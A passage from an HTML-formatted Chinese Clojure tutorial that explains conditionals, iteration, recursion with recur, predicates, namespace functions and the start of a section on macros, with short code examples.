&lt;li&gt;&lt;p&gt;&lt;strong&gt;condp&lt;/strong&gt;&lt;br&gt;condp 宏跟其他语言里面的switch/case语句差不多。它接受两个参数，一个谓词参数 (通常是= 或者instance?) 以及一个表达式作为第二个参数。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; choose [value]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;condp&lt;/span&gt;&lt;/span&gt; = value&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;one&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;two&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;three&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;str&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;unexpected value, &quot;&lt;/span&gt; value )))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;two&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;choose&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;unexpected value, 8&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;cond&lt;/strong&gt;&lt;br&gt;cond 宏接受任意个 谓词/结果表达式 的组合。按照顺序测试所有谓词，直到有一个为true，返回其结果。有点像一直&lt;code&gt;else if&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; chosse [t]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;cond&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;instance?&lt;/span&gt;&lt;/span&gt; String t) &lt;span class=&quot;string&quot;&gt;&quot;invalid temperature&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;/span&gt; t &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;span class=&quot;string&quot;&gt;&quot;freezing&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;/span&gt; t &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;) &lt;span class=&quot;string&quot;&gt;&quot;boiling&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;neither&quot;&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;迭代&quot;&gt;&lt;a href=&quot;#迭代&quot; class=&quot;headerlink&quot; title=&quot;迭代&quot;&gt;&lt;/a&gt;迭代&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;dotimes&lt;/strong&gt;&lt;br&gt;&lt;code&gt;dotimes&lt;/code&gt;执行给定的表达式一定次数, 一个本地binding会被给定值：从0到一个给定的数值。如果这个本地binding是不需要的，也可以用&lt;code&gt;_&lt;/code&gt;来代替。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dotimes&lt;/span&gt;&lt;/span&gt; [card-number &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;deal card number&quot;&lt;/span&gt; card-number))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  输出为 &lt;/p&gt;
  &lt;figure class=&quot;highlight applescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;deal card &lt;span class=&quot;built_in&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deal card &lt;span class=&quot;built_in&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deal card &lt;span class=&quot;built_in&quot;&gt;number&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;while&lt;/strong&gt;&lt;br&gt;&lt;code&gt;while&lt;/code&gt; 会一直执行一个表达式只要指定的条件为true。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; c &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;while&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; c &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; c (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dec&lt;/span&gt;&lt;/span&gt; c)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; -&amp;gt; ...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;dorun+for &amp;amp; doseq&lt;/strong&gt;&lt;br&gt;&lt;code&gt;doseq&lt;/code&gt;用来遍历集合在上面已经讲过了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;for&lt;/code&gt;的执行主体只可以采用单行语句，而&lt;code&gt;doseq&lt;/code&gt;可以采用多行语句，并且&lt;code&gt;for&lt;/code&gt;产生 lazy sequence。同时用&lt;code&gt;:when&lt;/code&gt;和&lt;code&gt;:while&lt;/code&gt;还可以做一些过滤，它们的区别在于&lt;code&gt;:when&lt;/code&gt;会迭代所有bindings并执行满足条件的主体，&lt;code&gt;:while&lt;/code&gt;会迭代所有bindings并执行满足条件的主体 &lt;strong&gt;&lt;em&gt;直到&lt;/em&gt;&lt;/strong&gt; 条件为false后跳出。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
  &lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; cols &lt;span class=&quot;string&quot;&gt;&quot;ABCD&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; rows (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;range&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; purposely larger than needed to demonstrate :while&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;for demo&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dorun&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;for&lt;/span&gt;&lt;/span&gt; [col cols &lt;span class=&quot;symbol&quot;&gt;:when&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;not=&lt;/span&gt;&lt;/span&gt; col \B)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        row rows &lt;span class=&quot;symbol&quot;&gt;:while&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt; row &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;str&lt;/span&gt;&lt;/span&gt; col row)))) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; 只可单行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;\ndoseq demo&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;doseq&lt;/span&gt;&lt;/span&gt; [col cols &lt;span class=&quot;symbol&quot;&gt;:when&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;not=&lt;/span&gt;&lt;/span&gt; col \B)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        row rows &lt;span class=&quot;symbol&quot;&gt;:while&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt; row &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;print&lt;/span&gt; col)      &lt;span class=&quot;comment&quot;&gt;; 可以&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;println&lt;/span&gt; row))   &lt;span class=&quot;comment&quot;&gt;; 多行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  执行结果如下，两段代码的结果是一致的。&lt;/p&gt;
  &lt;figure class=&quot;highlight mipsasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for demo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;A1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;A2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;C1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;C2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;D1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;D2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;doseq demo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;A1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;A2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;C1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;C2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;D1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;D2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;递归&quot;&gt;&lt;a href=&quot;#递归&quot; class=&quot;headerlink&quot; title=&quot;递归&quot;&gt;&lt;/a&gt;递归&lt;/h2&gt;&lt;p&gt;由于jvm的关系,clojure不会自动进行尾递归优化(&lt;a href=&quot;https://en.wikipedia.org/wiki/Tail_call&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;tail call optimization&lt;/a&gt;),在尾递归的地方,你应该明确的使用 &lt;code&gt;recur&lt;/code&gt; 这个关键词,而不是函数名。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; my-add [x y]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;if&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;zero?&lt;/span&gt;&lt;/span&gt; x)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;my-add&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dec&lt;/span&gt;&lt;/span&gt; x) (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;inc&lt;/span&gt;&lt;/span&gt; y))))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defn&lt;/span&gt;&lt;/span&gt; my-add [x y]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;if&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;zero?&lt;/span&gt;&lt;/span&gt; x)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;recur&lt;/span&gt;&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;dec&lt;/span&gt;&lt;/span&gt; x) (&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;inc&lt;/span&gt;&lt;/span&gt; y))))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一个不会进行尾递归优化,第二个会进行尾递归优化。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;loop&lt;/code&gt;和&lt;code&gt;recur&lt;/code&gt;配合可以实现和循环类似的效果。&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(loop [n number factorial 1]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (if (zero? n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      factorial&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      (recur (dec n) (* factorial n)))))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，&lt;code&gt;recur&lt;/code&gt;只能出现在special form的最后一行。&lt;/p&gt;
&lt;h2 id=&quot;谓词&quot;&gt;&lt;a href=&quot;#谓词&quot; class=&quot;headerlink&quot; title=&quot;谓词&quot;&gt;&lt;/a&gt;谓词&lt;/h2&gt;&lt;p&gt;false 和 nil 解释为 false&lt;br&gt;true 和其他任意值,包括 0 都被认为是 true&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;测试两值关系&lt;br&gt;&amp;lt;,&amp;lt;=,=,not=,==,&amp;gt;,&amp;gt;=,compare,distinct? 以及identical?.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;测试逻辑关系&lt;br&gt;and,or,not,true?,false? 和nil?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;测试集合&lt;br&gt;empty?,not-empty,every?,not-every?,some? 以及not-any?.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;测试数字&lt;br&gt;even?,neg?,odd?,pos? 以及zero?.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;测试对象类型&lt;br&gt;class?,coll?,decimal?,delay?,float?,fn?,instance?,integer?,isa?,keyword?,list?,macro?,map?,number?,seq?,set?,string? 以及vector?&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;命名空间-namespace&quot;&gt;&lt;a href=&quot;#命名空间-namespace&quot; class=&quot;headerlink&quot; title=&quot;命名空间(namespace)&quot;&gt;&lt;/a&gt;命名空间(namespace)&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;require&lt;/strong&gt;&lt;br&gt;导入clojure库。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;require&lt;/span&gt; &#39;clojure.string) &lt;span class=&quot;comment&quot;&gt;; 注意前面的单引号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  clojure里面命名空间和方法名之间的分隔符是/而不是java里面使用的&lt;/p&gt;
  &lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;clojure.string/join&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;$&quot;&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;1$2$3&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;alias&lt;/strong&gt;&lt;br&gt;alias 函数给一个命名空间指定一个别名来简化操作。以及处理类名冲突问题。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;alias&lt;/span&gt;&lt;/span&gt; &#39;su &#39;clojure.string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;su/join&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;$&quot;&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;1$2$3&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;refer&lt;/strong&gt;&lt;br&gt;&lt;code&gt;refer&lt;/code&gt;可以使指定的命名空间里的函数在当前命名空间里可以不需要包名前缀就能访问。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;refer&lt;/span&gt;&lt;/span&gt; &#39;clojure.string)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 上面的代码可以写成&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;join&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;$&quot;&lt;/span&gt; [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;]) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;1$2$3&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;use&lt;/strong&gt;&lt;br&gt;我们通常把require 和refer 结合使用, 所以clojure提供了一个use ， 它相当于require和refer的简洁形式。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;use&lt;/span&gt;&lt;/span&gt; &#39;clojure.string)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;ns&lt;/strong&gt;&lt;br&gt;ns宏可以改变当前的默认名字空间。它支持这些指令：&lt;code&gt;:require&lt;/code&gt;,&lt;code&gt;:use&lt;/code&gt;和&lt;code&gt;:import&lt;/code&gt;，后面的参数不需要quote。这些其实是它们对应的函数的另外一种方式，一般建议使用这些指令而不是函数。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;ns&lt;/span&gt;&lt;/span&gt; com.example.library&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;symbol&quot;&gt;:require&lt;/span&gt; [clojure.contrib.sql &lt;span class=&quot;symbol&quot;&gt;:as&lt;/span&gt; sql])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;symbol&quot;&gt;:use&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;com.example&lt;/span&gt; one two))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;symbol&quot;&gt;:import&lt;/span&gt; (&lt;span class=&quot;name&quot;&gt;java.util&lt;/span&gt; Date Calendar)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      (&lt;span class=&quot;name&quot;&gt;java.io&lt;/span&gt; File FileInputStream)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;宏-Macro&quot;&gt;&lt;a href=&quot;#宏-Macro&quot; class=&quot;headerlink&quot; title=&quot;宏(Macro)&quot;&gt;&lt;/a&gt;宏(Macro)&lt;/h2&gt;&lt;p&gt;宏是在读入期（而不是编译期）就进行实际代码替换的一个机制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;反引号(`)&lt;br&gt;防止宏体内的任何一个表达式被evaluate。这意味着宏体里面的代码会原封不动地替换到使用这个宏的所有的地方 – 除了以波浪号开始的那些表达式。&lt;/p&gt;
&lt;/li&gt;
